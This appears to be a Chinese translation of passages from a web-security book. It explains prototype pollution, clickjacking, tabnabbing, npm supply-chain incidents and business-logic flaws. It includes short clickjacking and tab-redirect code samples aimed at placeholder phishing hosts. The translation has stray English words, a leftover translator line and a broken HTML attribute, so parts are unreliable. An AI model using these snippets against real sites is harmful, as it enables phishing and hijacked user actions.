在对 Web 应用程序成功实施原型链污染后，你可以通过几种操作来获取信息或干扰预期的客户端执行。

##### 拒绝服务

原型链污染攻击可用于减慢或干扰正常的客户端脚本执行。例如，将一个值更改为浮点数而不是整数。这将在后续环节引起 bug，并干扰客户端应用程序的预期使用场景。

##### 属性注入

如果脚本依赖特定值进行函数调用，则可以通过原型链污染来修改该值。这可能会导致针对网络发起非预期的调用，或者在客户端以终端用户未预期的方式调用某些功能。

##### 远程代码执行

通常来说，这是原型链污染最坏的情况。在客户端原型链污染领域，这会将攻击升级为 XSS；在 Node.js（服务端）领域，攻击可以升级为真正的服务端代码执行。这两种结果都会导致应用程序状态、数据和功能遭到破坏。通常，将原型链污染升级为代码执行需要一个脚本执行接收器，如 `eval()`，或者一个 DOM 节点生成函数，如 `DOMParser.parseFromString()`。

### 点击劫持攻击

点击劫持（Clickjacking）攻击是针对浏览器中的终端用户实施的隐蔽但影响巨大的攻击。点击劫持攻击将恶意 UI 元素与非恶意 UI 元素合并，或者透明地欺骗浏览器向恶意服务器或函数调用发送输入，而不是发送给预期的函数调用。

有许多使用点击劫持攻击应用程序的方法，其实施涉及 JavaScript、HTML 和 CSS，既可以单独使用，也可以与其他技术结合使用。将点击劫持攻击视为一种用户界面键盘记录器（User-interface keylogger）是可行的。当针对毫无防备的终端用户部署时，点击劫持攻击可以让攻击者窃取无意被第三方读取的宝贵用户输入。

#### 摄像头和麦克风漏洞利用

点击劫持最著名早期示例之一是 Adobe Flash 麦克风和摄像头劫持漏洞，该漏洞在安全研究人员 Robert Hansen 和 Jeremiah Grossman 发现后于 2008 年在网络上被公开。这种点击劫持攻击以一组 Web 链接的形式出现，这些链接看起来像是与 Adobe Flash 播放器完全无关的游戏或网页。

终端用户所不知道的是，在这个游戏或网页中的每一次点击，实际上都对应着对其下方的 iframe 嵌套的 Adobe Flash 网页版设置页面的点击。Adobe Flash 设置页面是在 iframe 中加载的，其透明度（opacity）被设置为零，因此对终端用户来说是不可见的。

当与点击劫持网页交互时，终端用户被欺骗，将点击操作传递给了特权的 Adobe Flash 隐私设置。结果是，Adobe Flash 浏览器插件会与黑客共享摄像头和麦克风的控制权。这成为了信息安全领域最著名的点击劫持案例之一，因为它能够使用插件跃出浏览器沙箱并获得对计算机硬件的特权访问。

#### 创建点击劫持漏洞利用

现代点击劫持可以通过多种方式完成。最常用的方法是制作一个看起来合法的网站，并在其下方包含一个指向你想要攻击的网站的隐形 iframe。

考虑以下示例网站：

```html
<html>
<head>
 <title>Clickjacker</title>
</head>
<body>
 <div id="clickjacker">
 <span id="fake_button">click me</span>
 </div>
 <iframe id="target_website" src="target-website.com"></iframe>
</body>
</html>
```

在本例中，我们通过在 `clickjacker` div 下方出现的 iframe 中实例化 `target-website.com` 来对其进行攻击。我们可以使用以下 CSS 类来使 `target-website.com` 对终端用户不可见：

```css
#target_website {
opacity: 0;
}
```

`clickjacker` div 包含一个按钮，可以使用 CSS 定位将其直接置于 iframe 中合法按钮的上方：

```css
#fake_button {
position: relative;
right: 25px;
top: 25px;
pointer-events: none;
background-color: blue;
}
```

通过将 `pointer-events: none` CSS 属性添加到 `#fake_button`，任何针对 `#fake_button` 的交互（点击）都将传递给其下方的元素。在这种情况下，其下方的元素存在于 iframe 内部，而终端用户本无意点击它。当点击 `#fake_button` 时，点击事件将穿透传递给 iframe，并触发另一个网站中的功能。

不幸的是，由于浏览器的安全模型，iframe 很可能能够访问被框架化网站的会话 Cookie。这意味着该点击可以发起针对 Web 服务器的特权请求，例如调用 API 将个人资料设为公开，或发起金融交易。

针对任何缺乏适当框架控制的 Web 应用程序，点击劫持攻击是欺骗用户代表攻击者调用功能的最简单方法之一。

### 标签页劫持与反向标签页劫持

标签页劫持（Tabnabbing）及其姐妹攻击反向标签页劫持（Reverse tabnabbing）是客户端攻击的一种形式，它结合了网络钓鱼（Phishing）攻击（欺骗终端用户与恶意网页交互的攻击）和重定向（Redirect）攻击（将当前网页重定向到恶意网页的攻击）的元素。

在标签页劫持攻击中，浏览器 DOM API 被滥用，以便将当前页面重定向到新页面，或者用黑客提供的 HTML/CSS 和 JS 重写当前页面的内容。

#### 传统标签页劫持

标签页劫持攻击的传统实现是通过滥用 `window` 对象来运作的，该对象随所有主流 Web 浏览器一起提供，并被定义为 WHATWG DOM 规范的一部分。当通过附加到 `window` 对象的 `window.open()` 函数打开新标签页时，该函数调用会返回对打开新标签页的 `window` 对象的引用。

在传统的标签页劫持方法中，调用新标签页的网站是攻击者，如以下代码示例所示：

```html
<button onclick="goToLegitWebsite()">click to go to legit website</button>
```

```javascript
const goToLegitWebsite = function() {
// open new tab pointing to legit-website.com
const windowObj = window.open("https://website-b.com");

// after 5 minutes, change the other tab to compromised website
setTimeout(() => {
 windowObj.location.replace("https://website-c.com");
}, 1000 * 60 * 5);
};
```

在这个传统标签页劫持的例子中，网站 A 向用户提供了一个在另一个标签页中打开网站 B 的链接。新标签页打开并加载了网站 B，但由于它是从 `open()` 函数调用中打开的，因此在打开的标签页（网站 A）中存储了对引导新标签页的 `window` 对象的引用。

在稍后的时间点，在终端用户已经验证了新标签页是合法的之后，打开的标签页（网站 A）伸入网站 B 的 DOM API 副本中，并使用 `windowObj.location.replace()` 发起重定向。网站 B 现在已被重定向到网站 C。网站 C 在外观上与网站 B（合法网站）完全相同，但当用户尝试重新登录时，它只是复制他们的凭据，将其发送到黑客的服务器，然后重定向到网站 B 上的错误页面。

这种攻击工作流程相当复杂，但最终结果是包含网站 B 的标签页被暂时替换为了网站 C——一个由黑客维护的恶意网站。由于用户最初验证了新标签页包含合法网站，他们不太可能会注意到内容的快速变化，这甚至可能在他们浏览另一个标签页时就发生了。结果，欺骗用户在被劫持的标签页中输入凭据或其他敏感信息，变得比传统的网络钓鱼攻击容易得多。

整个工作流程得以实现，是因为浏览器 DOM 函数 `window.open` 会返回对新标签页中 `window` 对象的引用，并允许打开的标签页针对新标签页进行函数调用。利用这个漏洞非常简单，只需开发一个带有标签页劫持 JavaScript 代码的网站，开发一个与合法网站的美学和用户体验相匹配的钓鱼网站，然后欺骗终端用户点击链接以打开新的（受控的）标签页。

#### 反向标签页劫持

反向标签页劫持的工作方向与传统标签页劫持相反。反向标签页劫持中，攻击者不是发起新标签页的网站，而是在新标签页中被打开的网站，且攻击者针对的是初始标签页。存在多种通过反向标签页劫持攻击终端用户的方法，每种方法都依赖于某个标签页针对打开它的标签页执行 DOM API 调用的机制。

##### DOM API 攻击

通过反向标签页劫持进行攻击最简单的方法是再次建立一个恶意网站。然后，你设法说服一个合法网站使用 `window.open()` 函数调用来打开你的恶意网站。

当调用 `window.open()` 创建新标签页时，默认情况下，打开程序（opener）会将对其 `window` 对象的引用传递给新标签页。这类似于传统标签页劫持攻击的工作方式。

考虑以下示例：

```html
<!-- UI element for legit website -->
<button onclick="openTab()>click me</button>
```

```javascript
// Script for legit website
window.open("https://malicious-website.com")

// Script for malicious website
window.opener.location.replace("https://get-hacked.com")
```

如你所见，通过引用新创建标签页的 `window` 对象上的 `opener` 属性，新标签页可以开始控制生成它的原始标签页。通过控制原始标签页，新标签页现在可以将原始标签页的位置从合法网站更改为非法网站——并利用该新网站盗取终端用户的凭据和其他信息。

与传统标签页劫持非常相似，通过开发和托管一个向打开程序的 `window.opener` 属性进行函数调用的恶意网站，该攻击很容易执行。主要缺点是，其他形式的标签页生成和 `window.opener` 属性之外的重定向并不都会产生带有 `window.opener` 引用的标签页，因此并非所有网站都会受到这种形式的攻击。

##### HTML 链接攻击

如果你打算使用反向标签页劫持攻击的网站中没有 `window.opener` 属性，只要该链接使用了 `target=_blank` 属性，并且你能够生成 HTML 链接或诱骗该网站代表你生成 HTML 链接，那么仍然可以实施攻击。

`target=_blank` HTML 链接属性还将强制在新生成的标签页的 `window` 对象中包含 `opener` 引用：

```html
<!-- legit website, spawned in a user generated link -->
<a href="https://malicious-website.com" target="_blank">click me</a>
```

```javascript
// malicious website script
window.opener.location.replace("https://get-hacked.com")
```

##### Iframe 攻击

最后，如果上述两种反向标签页劫持攻击媒介都不可行，你可以在 iframe 内部执行反向标签页劫持。如果调用的 iframe 链接到你的恶意网站，并且该 iframe 没有实现反向标签页劫持的防御措施（例如，`sandbox` 属性或 CSP 策略），你将能够通过 DOM 属性 `window.parent` 访问父 `window` 对象：

```html
<!--- legit website -->
<iframe src="https://malicious-website.com"></iframe>
```

```javascript
// malicious website JavaScript
window.parent.location.replace("https://get-hacked.com");
```

总之，标签页劫持攻击依赖于一个标签页通过不安全的浏览器 DOM API 函数调用，获得对控制另一个标签页的 `window` 对象的访问权限。一旦恶意标签页获得了对该 `window` 对象的访问权限——无论是通过直接 DOM 调用、不安全的 HTML 链接，还是不安全的 iframe 生成——合法标签页现在就被攻破了，因为浏览器 DOM 提供了可以从任何位置调用的控制 API。

### 总结

归纳而言，客户端攻击是指那些要么完全以浏览器客户端为目标，要么能够在不需要向 Web 服务器发起请求的情况下对浏览器客户端部署的攻击。像标签页劫持、点击劫持和原型链污染这样的客户端攻击，允许攻击者破坏用户的应用程序状态并拦截他们的按键输入——这通常是在提供客户端应用程序代码的服务器不知情且无法检测的情况下发生的。

对于任何类型的攻防安全专家来说，理解客户端攻击都是现代全方位安全工具箱中不可或缺的组成部分。

***

## 第 17 章 利用第三方依赖

如今的软件构建在开源软件（Open Source Software，OSS）之上已不是什么秘密。即使在商业领域，许多最大且利润最丰厚的产品也是在世界各地大量开发人员的开源贡献支持下构建起来的。

一些构建在 OSS 之上的产品包括：

* Reddit (BackBoneJS, Bootstrap)
* Twitch (Webpack, nginx)
* YouTube (Polymer)
* LinkedIn (EmberJS)
* Microsoft Office Web (Angular)
* Amazon DocumentDB (MongoDB)

除了单纯地依赖 OSS 之外，许多公司现在还将他们的核心产品作为开源软件提供，并通过提供支持或持续服务来获取收入，而不是直接销售产品。这方面的一些例子包括：

* Automattic Inc. (WordPress)
* Canonical (Ubuntu)
* Chef (Chef)
* Docker (Docker)
* Elastic (Elasticsearch)
* Mongo (MongoDB)
* GitLab (GitLab)

BuiltWith 是一个 Web 应用程序的示例，它对其他 Web 应用程序进行指纹识别（Fingerprint），以尝试确定它们是构建在什么技术之上的。这对于快速确定 Web 应用程序背后的技术非常有用。

首先，依赖 OSS 意味着依赖一个可能没有经过像你自己的代码那样严格审计的代码库。对庞大的 OSS 代码库进行审计是不切实际的，因为你首先需要让你的安全工程师足够熟悉该代码库，然后你需要对该代码进行深入的、特定时间点的分析。这是一个非常昂贵的过程。

特定时间点的分析也是有风险的，因为 OSS 代码库在不断更新。理想情况下，你还需要对每个传入的 Pull Request（拉取请求）进行安全评估。不幸的是，这也会非常昂贵，而且大多数公司不会支持这种类型的财务损失，宁愿承担使用相对不熟悉软件 carbon 的风险。

出于这些原因，对于想要攻破他人软件的黑客来说，OSS 集成和依赖是一个绝佳 advisory 的起点。记住，链条的强度取决于它最薄弱的一环，而最薄弱的一环往往是经历最不严格质量保证的那一环。

作为黑客，寻找可利用的 OSS 集成或依赖的第一步是进行侦察（Recon）。在侦察之后，对这些集成的利用可以从多个不同的角度进行。

让我们进一步调查 OSS 集成。首先，我们想对 Web 应用程序如何与 OSS 集成有一些了解。

一旦我们理解了这些集成如何发生的基本原理，我们就可以对 OSS 集成的风险进行进一步的调查。然后，我们可以学习如何利用 Web 应用程序中的 OSS 集成。

### 集成方法

当 Web 应用程序的开发人员希望与 OSS 应用程序进行集成时，从架构的角度来看，通常有几种方法可以实现。了解 Web 应用程序和 OSS 包之间的集成是如何构建的非常重要，因为这通常决定了两者之间流动的数据类型、数据流动的方法，以及主应用程序赋予 OSS 代码的特权级别。

与 OSS 的集成可以通过许多不同的方式建立。一个高度集中化的案例涉及直接集成到核心应用程序代码中。或者，它可能涉及在自己的服务器上运行 OSS 代码，并设置一个用于从主应用程序到 OSS 集成的单向通信的 API（这是去中心化的方法）。这些方法中的每一种都有优缺点，并且都给任何试图保护它们安全的人带来了不同的挑战。

#### 分支与分叉

当今的大多数 OSS 都托管在基于 Git 的版本控制系统（Version Control System，VCS）上。这是现代 Web 应用程序和传统 Web 应用程序之间的一个主要区别，因为 10 年前，OSS 可能托管在 Perforce、Subversion 甚至微软的 Team Foundation Server 中。

与许多传统的 VCS 不同，Git 是分布式的。这意味着开发人员不是在中央服务器上进行更改，而是各自下载自己的软件副本并在本地进行更改。一旦在主构建的“分支（Branch）”上进行了适当的修改，开发人员就可以将他们的更改合并（Merge）到主分支（单一真理源）中。

当开发人员将 OSS 用于自己的用途时，有时他们会针对该软件创建一个分支，并运行他们创建的分支，而不是主分支。这种工作流程允许他们进行自己的修改，同时轻松地引入其他开发人员推送到主分支的更改。

分支模式伴随着风险。开发人员很容易不小心将未经审查的代码从主分支拉取到他们的生产分支中。

另一方面，分叉（Fork）提供了更高水平的隔离，因为分叉是在创建分叉之前推送到主分支的最后一次提交处开始的新仓库。作为一个新仓库，分叉可以拥有自己的权限系统、自己的所有者，并实现自己的 Git 钩子（Hooks），以确保不会意外合并存在安全隐患的更改。

使用分叉模式部署 OSS 的一个缺点是，随着时间的推移，从原始仓库合并代码可能会变得相当复杂，并且提交需要仔细地挑选（Cherry-pick）。如果在创建分叉后进行了重大的重构，有时来自原始仓库的提交将不再与分叉兼容。

#### 自托管应用集成

一些 OSS 应用程序是预先打包好的，通常带有简单的安装向导。WordPress 就是这方面的一个典型例子。它最初是一个高度可配置的基于 PHP 的博客平台，现在它在大多数基于 Linux 的服务器上提供简单的一键安装。

与通过源代码分发 WordPress 不同，WordPress 开发人员建议下载一个脚本，该脚本将自动在你的服务器上设置 WordPress 安装。运行此脚本，将建立正确的数据库配置，并且将专门根据在设置 UI 中向你展示的配置来生成文件。

这类应用程序集成到你的 Web 应用程序中风险最高。一个简单的一键设置博客软件听起来可能不会引起太多麻烦，但此类系统往往会使以后发现和解决漏洞变得更加困难（如果没有在逆向工程设置脚本上投入大量精力，你将无法知道所有文件的位置）。通常，你应该远离这种部署方法，但当你必须走这条路时，你还应该找到 OSS 仓库，并仔细分析设置脚本以及该仓库中针对你的系统运行的任何代码。

这些类型的包需要提升的特权，并且很容易导致后门 RCE。由于脚本本身很可能在你的 Web 服务器上以管理员或特权用户身份运行，这可能会对你的组织造成危害。

#### 源码集成

OSS 与专用 Web 应用程序集成的另一种方法是通过直接源码、代码级的集成。这是一种复制/粘贴的雅致说法，但通常可能更为复杂；一个大型库可能还需要将其自身的依赖和资产与其一同集成。

当处理大型 OSS 库时，这种方法在前期需要相当多的工作，但对于较小的 OSS 库来说，它非常简单。对于一个 50-100 行的简短脚本，这可能是理想的集成方法。对于小型工具或辅助函数，直接源码集成通常是最佳选择。

较大的包不仅更难集成，而且还伴随着更多的风险。分叉和分支模式带来了风险；不安全的上游更改可能会意外地集成到与你的 Web 应用程序集成的 OSS 代码中。直接集成方法有其自身的风险；没有简单的方法可以接收上游修复的通知，并且将该补丁引入你的软件中可能会非常困难且耗时。

这些方法中的每一种都有优缺点，并且对于每个应用程序来说，没有绝对正确的方法。确保通过多种指标（包括大小、依赖链和主分支中的上游活动）仔细评估你希望引入并集成的代码。

### 包管理器

如今，专用 Web 应用程序与 OSS 之间的许多集成都是通过一种名为包管理器（Package manager）的中间应用程序实现的。包管理器是确保你的软件始终从网络上的可靠来源下载正确的依赖，并对其进行正确设置的应用程序，以便无论你的应用程序运行在什么设备上，都可以使用这些依赖。

包管理器在很多方面都很有用。它们抽象了复杂的集成细节，减小了仓库的初始大小，并且如果配置正确，可以仅拉取你当前开发工作所需的依赖，而不是为大型应用程序拉取每个依赖。在小型应用程序中，这可能用处不大，但对于一个拥有 100 多个依赖的大型企业软件套件，这可以为你节省数吉字节（GB）的带宽和数小时的构建时间。

每种主流编程语言都至少有一个包管理器，其中许多遵循与其他语言相似的架构模式。每个主流包管理器都有自己的怪癖、安全保护措施和安全风险。我们无法在本章中评估每一个包管理器，但我们可以分析几个最流行的包管理器。

#### JavaScript

直到最近，JavaScript（和 Node.js）开发生态系统几乎完全构建在一个名为 npm 的包管理器之上。

尽管市场上出现了替代方案，但 npm 仍为网络上绝大多数基于 JavaScript 的 Web 应用程序提供支持。npm 在大多数应用程序中作为一个 CLI 存在，用于访问由 npm, Inc. 免费托管的、由开源库组成的庞大数据库。

你可能偶然或有意地接触过基于 npm 的应用程序。应用程序通过 npm 引入依赖的关键标志是应用程序根目录中的 `package.json` 和 `package.lock` 文件，它们向 CLI 指示在构建时将哪些依赖和版本引入到应用程序中。

与大多数现代包管理器一样，npm 不仅解决顶级依赖关系，还解决递归子依赖关系（Recursive child dependencies）。这意味着如果你的依赖也依赖于 npm，npm 也会在构建时将这些依赖引入。

npm 宽松的安全机制使其在过去成为恶意用户的目标。由于其广泛的使用，其中一些事件已经影响了数百万个应用程序的运行时间。

这方面的一个例子是 `left-pad`，一个由一个人维护的简单实用库。2016 年，`left-pad` 被从 npm 中下架，导致依赖这一单页工具的数百万个应用程序的构建管道中断。作为回应，npm 不再允许在发布包后经过一定时间将其从注册表中删除。

2018 年，`eslint-scope` 所有者的凭据被黑客入侵，该黑客发布了新版本的 `eslint-scope`，该版本会窃取安装它的任何机器上的本地凭据。这证明了 npm 库可以被黑客用作攻击媒介。自该事件以来，npm 增加了关于安全的文档，但受感染的包维护者凭据仍然是一个风险，如果被利用，由于恶意脚本下载，可能导致公司源代码、知识产权（IP）丢失或普遍的恶意危害。

同样在 2018 年，类似的攻击发生在 `event-stream` 上，该软件添加了 `flatmap-stream` 的依赖。`flatmap-stream` 包含一些恶意代码，用于窃取安装了该软件的计算机上的比特币钱包，从而在不知情的情况下从许多依赖 `flatmap-stream` 的用户那里窃取了钱包。

如你所见，npm 在许多方面都非常容易被利用，并带来了重大的安全风险，因为在源代码级别评估大型应用程序的每个依赖和子依赖几乎是不可能的。仅仅将你的开源 npm 包集成到商业应用程序中，就可能成为一个导致公司 IP 完全受损或更糟的攻击媒介。

我提出包管理器存在风险并提供示例，仅是为了能够正确地缓解此类风险。我还建议，如果你试图使用 npm 库来攻击企业，你只能在获得所有者的明确书面许可下进行，并且仅在红队风格的测试场景基础上进行。

#### Java

Java 使用广泛的包管理器，例如 Ant 和 Gradle，其中最流行的是由 Apache 软件基金会支持的 Maven。Maven 的运作方式类似于 JavaScript 的 npm——它是一个包管理器，通常集成在构建管道中。

由于 Maven 的出现早于 Git 版本控制，其依赖管理代码的大部分都是从头开始编写的，而不是依赖于通过 Git 提供的功能。因此，尽管两者的功能非常相似，但 npm 和 Maven 之间的底层实现是不同的。

Maven 在过去也曾是攻击的目标，尽管通常这些攻击受到的媒体关注少于 npm。就像 npm 一样，Maven 项目和插件也可以被攻破并导入到合法的应用程序中。此类风险并不局限于任何一种包管理软件。

#### 其他语言

C#、C、C++ 以及大多数其他主流编程语言都拥有类似于 JavaScript 或 Java 的包管理器（NuGet、Conan、Spack 等）。它们中的每一个都可以用类似的方法进行攻击，要么通过添加恶意包（随后该包被合并到合法应用程序的代码库中），要么通过添加恶意依赖（随后该依赖被合并到合法包中，然后合并到合法应用程序的代码库中）。

通过包管理器进行攻击可能需要结合社会工程学和代码混淆技术。恶意代码必须不在显眼的地方，以便它不易被识别，但仍能执行。

归根结底，包管理器与任何开源集成方法都存在相似的风险。很难完整地审查大型 OSS 包中的代码，尤其是当你考虑到它的依赖关系时。

### 通用漏洞披露数据库

一般来说，将包部署到包管理器并将其集成到应用程序中可以作为一种攻击媒介，但这需要大量的长期努力和规划。快速利用第三方依赖的最受欢迎的方法是确定应用程序依赖中尚未打补丁的已知漏洞，并攻击这些依赖。

幸运的是，当在许多包中发现漏洞时，这些漏洞会公开披露。这些漏洞通常会进入在线数据库，例如美国商业部国家标准与技术研究院的美国国家漏洞数据库（National Vulnerability Database，NVD）或由美国国土安全部赞助的 Mitre 通用漏洞披露（Common Vulnerabilities and Exposures，CVE）数据库。

这意味着流行的第三方应用程序很可能会有已知且有记录的漏洞，这是许多公司合作并贡献他们自己的安全分析研究以供他人阅读的结果。

当试图在较小的包中寻找已知漏洞时，CVE 数据库并不是特别有用，例如只有两个贡献者且已被下载了 300 次的 GitHub 仓库。另一方面，像 WordPress、Bootstrap 或 JQuery 这样拥有数百万用户的主流依赖在引入生产环境之前，通常已经接受了许多公司的仔细审查。因此，大多数严重漏洞很可能已经在外网上被发现、记录并发布。

JQuery 就是一个很好的例子。作为 JavaScript 中最常用的前 10 个库之一，JQuery 被用于超过 1000 万个网站，在 GitHub 上拥有超过 18,000 个分叉，此外还有 250 多个贡献者，并拥有包含 150 个版本的约 7000 次提交。

由于其广泛的使用和可见性，JQuery 在安全编码和架构方面不断受到高度关注。JQuery 中的严重漏洞可能会对世界上一些最大的公司造成严重破坏——其破坏范围将非常广泛。

快速浏览一下 NVD 的 CVE 数据库，可以发现多年来报告的数十个 JQuery 漏洞。这些漏洞包括重现步骤和威胁评级，以确定该漏洞有多容易被利用，以及该漏洞会给组织带来什么程度的风险。

作为攻击者，这些 CVE 数据库可以为你提供利用包含先前公开漏洞的应用程序的详细方法。CVE 数据库使得发现和利用漏洞变得非常容易，但你仍必须利用侦察技术来正确识别依赖项、它们与主应用程序的集成，以及这些依赖项所使用的版本和配置。

### 总结

第三方依赖（特别是来自开源软件领域的依赖）的泛滥，在许多 Web 应用程序的安全中创造了一个极易被忽视的缺口。黑客、漏洞赏金猎人或渗透测试人员可以利用这些集成，并快速启动他们对活跃漏洞的搜索。第三方依赖可以通过多种方式受到攻击，从低劣的集成到第四方代码，或者只是通过寻找其他研究人员或公司发现的已知漏洞。

虽然第三方依赖作为攻防攻击矢量的话题非常广泛，且难以精确剖析，但在任何类型的攻防型测试环境中，都应始终考虑这些依赖。理解它们在复杂 Web 应用程序中的作用可能需要一些侦察工作，但一旦完成了侦察工作，依赖中的漏洞通常会比第一方代码中的漏洞更快显现出来。这是因为这些依赖缺乏与第一方代码相同严格的审查和保障过程，使其成为进行任何类型 Web 应用程序利用的极佳起点。

以下是第 18 章的完整中文翻译：

***

## 第 18 章 业务逻辑漏洞

在前面的章节中，我们讨论了影响大多数 Web 应用程序的许多常见漏洞。这些漏洞很容易使用诸如注入（Injection）或拒绝服务（Denial of Service）等术语进行分类。上述漏洞几乎总是呈现出一致的形态，这使得它们在类别上很容易定义。这也意味着，针对这些常见漏洞的攻击攻防策略和缓解防御策略在所有受影响的应用程序中都相对一致。

到目前为止，我们学习的都是典型 Web 应用程序漏洞。但是，当我们遇到某个单个应用程序所特有的漏洞时会发生什么？特有的漏洞最常由于应用程序实现了特定的业务逻辑（Business Logic）规则而产生。黑客随后会寻找利用这些程序设定规则并获得非预期结果的方法。换句话说，我们到目前为止所学习的漏洞可能是由于应用逻辑（Application Logic）导致的，而不是因为业务规则（Business Rules）导致的。

应用逻辑结合了信息和指令，以便执行 Web 应用程序中常见的任务，例如渲染图像或发起网络调用。另一方面，业务规则是特定实现该业务的企业所特有的。业务规则的一个示例是：仅允许乘客在预订时间前 24 小时以上取消预订。

业务规则实现中的漏洞通常被称为业务逻辑漏洞（Business logic vulnerabilities）。这种形式的漏洞更难发现和利用，因为根据定义，它们需要理解特定应用程序特有的一套特定业务规则。

这与利用在许多应用程序中以相对一致的方式实现的标准应用逻辑的常见漏洞形成了鲜明对比。由于这种增加的复杂性，业务逻辑漏洞通常是发现和利用难度最高的漏洞，但如果被成功利用，它们往往也具有最大的影响并带来最丰厚的回报。

最后需要指出的是，业务逻辑漏洞虽然难以手动发现，但使用标准的自动化工具也是几乎不可能发现的。这是因为几乎所有旨在发现漏洞的工具都不是针对特定应用程序和一套特定业务规则设计的，而是配置为攻击广泛的、使用了共享应用框架、语言和系统设计的应用程序。

闲言少叙，让我们评估一些常见的业务逻辑漏洞，并讨论利用它们的方法。

### 自定义数学计算漏洞

与数学计算相关的漏洞是业务逻辑漏洞最常见的形式之一。几乎所有应用程序都会使用数学来代表其用户进行计算，但数学操作背后的逻辑往往有所不同。

考虑示例应用程序 MegaBank。在前面的章节中，我们注意到 MegaBank 为其客户托管的 Web 应用程序允许已认证的用户通过向另一个用户发送货币来完成交易。

让我们考虑一下代表像 MegaBank 这样的应用程序进行转账是什么样的：

1. 当前已认证的用户（用户 A）在用户界面中指定他们希望向用户 B 发送 $500。
2. 服务器验证用户 B 是否存在。
3. 服务器向用户 A 发送确认请求。
4. 用户 A 向服务器发送确认“接受”请求。
5. 服务器通过将数据库中与用户 A 关联的余额字段减少 500，从而从用户 A 的账户中扣除。
6. 服务器在数据库中将用户 B 的余额字段增加 500。
7. 服务器向用户 A 发送交易完成确认。

现在，这种转账方法在冗余性、安全防范和并发性方面存在许多问题。为了本章的目的，我们仅评估在服务器上执行的、用于完成此交易的数学计算可能会出现什么问题。

首先，虽然服务器检查并确保了用户 B 存在，但它没有检查并确认用户 A 实际上是否拥有转账给用户 B 所需的资金。在用户 A 的余额上简单地缺少了验证（检查是否有足够的金额进行转账），可能会带来许多影响。

在最好的情况下，数据库模式（Database schema）中的约束会取消该交易并报错退出——尽管应用程序的代码中缺少了适当的业务逻辑检查。在最坏的情况下，用户 A 的资金停留在 $0，而用户 B 的资金每次交易继续增加 $500。这允许用户 B 和用户 A 进行协作，在银行注意到之前提取数千美元。

前面的示例实际上是一个非常简单的业务逻辑漏洞。

如果应用程序没有同时实现以下两个要求，它就会成为黑客利用的极佳目标：

* 满足其业务逻辑预期的正确数学计算
* 针对输入到数学函数中的数据的正确验证

由于此类漏洞依赖于银行关于转账的特定业务模型，因此任何静态分析工具都很可能无法发现它们。

你可以将针对此漏洞的攻击描述为：黑客找到了一种在遵守程序设定规则的同时，绕过预期功能的方法。

### 程序设定的副作用

大多数应用程序在编程时都想到了一个主要的用例，该用例用于开发应用程序将运行于其上的业务规则。通常，随着 Web 应用程序复杂性的增加，应用程序将开始产生副作用（Side effects），或者由于以开发人员未预料到的方式使用程序设定的功能，而发生非预期的变化。

考虑另一个 Web 应用程序：MegaCrypto。在这个假设的 Web 应用程序中，MegaBank 用户能够使用新的 MegaCrypto Web 门户在彼此之间购买、出售和兑换加密货币。MegaBank 预测这将提高其在更年轻、更精通技术的客户中的受欢迎程度。

与任何其他交易所一样，MegaBank 知道它需要流动性（Liquidity）来支持用户的加密货币购买、出售和兑换。它决定最初提供五种主要的加密货币。MegaCrypto 出售这些货币的价格由市场需求决定。当 MegaCrypto 推出时，MegaBank 做出了解设，即本地市场价格将反映 MegaCrypto 决定在其平台上提供和兑换的加密货币的全球市场价格。在 MegaCrypto 上出售和兑换的硬币如下：

* MegaCoin
* ByteCoin
* DoggoCoin
* GhostCoin
* HardDriveCoin

由于该应用程序的预期功能是市场需求决定了可以购买或兑换加密货币的价格，因此当前的价格如下：

* MegaCoin——$1
* ByteCoin—$50,000
* DoggoCoin—$5
* GhostCoin—$2,000
* HardDriveCoin—$10

每天午夜，MegaCrypto 会通过首先向其用户购买（如果已提交销售订单），其次向另一个交易所购买来补充其流动性池。MegaCrypto 的业务逻辑以这种方式运作，即首先从正在出售的用户那里回购加密货币，因为这减少了 MegaCrypto 否则需要支付给另一个交易所购买流动性的手续费。

MegaCrypto 的客户 Henry Hacker 能够查看公开记录，并注意到当流动性较低时，MegaCrypto 会首先从其用户那里回购硬币。换句话说，他逆向工程了 MegaCrypto 用于维持流动性池的业务逻辑。他在自己的侦察日志中记录了这一点。

Henry Hacker 观察到，新交易所随时持有的硬币总量相当低。换句话说，在满负荷情况下，该交易所的流动性仅占全球加密货币市场的一小部分——事实上，它只是一个投资者群体能够凑集资金的一小部分。在任何给定时间，流动性储备中仅持有约 $100 万总额的硬币。

在执行了多次交易并观察到新交易所通过按市场价格向其现有用户购买来补充其流动性池之后，Henry Hacker 决定请求他的富豪朋友们凑集一些资金供他投资。他获得了 $100 万的初始资本。

Henry 发现，随着时间的推移，MegaCrypto 交易所对 ByteCoin 的需求平均为每天 20 次购买（每个 $50,000 价格，总计 $100 万）。他注意到，ByteCoin 平均每年从 MegaCrypto 的流动性池流出 20 个到用户的 MegaCrypto 钱包中。

同样，每天下午，MegaCrypto 会在其本地用户池中以本地市场价格为 20 个 ByteCoin 创建购买订单。通过在夜间从本地用户那里回购硬币，MegaCrypto 最终从交易费中获得了显着的收益，并且其用户也很高兴。

Henry 决定编写一个算法，该算法将自动在每晚以 $50,000 的价格购买 20 个 ByteCoin，这与全球市场价格相匹配。紧接着，他的脚本将以每个 $100,000 的价格列出这些 ByteCoin 以供出售。在将该算法部署到生产环境后，他在前一天仅投资了 $100 万之后，第二天醒来时账户里有了 $200 万。

Henry 的所作所为实际上可能并不违法，但根据 MegaCrypto 的说法，这绝对会被视为一个漏洞。如果没有快速的修复，这可能会导致 MegaCrypto 每天损失数百万美元。

这里的问题在于，MegaCrypto 的应用逻辑没有考虑到以下事实：一个受限的、本地的流动性池可能不够庞大，无法模拟全球市场价格。此外，如此小的总流动性池允许非常富有的个人（或在这种情况下，一个群体）上下操纵市场。

MegaCrypto 是一个数字货币交易所，这意味着它所要做的就是在其应用程序中包含逻辑，以阻止购买本地硬币（并去其他地方购买），前提是本地没有以全球市场价格提供硬币。

外表上看起来是一个经济问题，实际上也是一个业务逻辑漏洞。通过适当的边界情况检测，允许 MegaCrypto 仅在价格处于全球市场平均价格的百分比阈值内时才回购本地硬币，本可以避免 MegaCrypto 的这些重大损失。

像这样的漏洞需要对复杂系统有深入的了解，但一旦掌握了这些知识，就可能以利润极高且难以检测的方式，攻击 Web 应用程序或一套数字系统。

### 准现金攻击

到目前为止，我们已经研究了由于数学计算不当而产生的业务逻辑漏洞，以及由于未能将预期功能的副作用恰当地考虑到初始应用架构中而产生的业务逻辑漏洞。

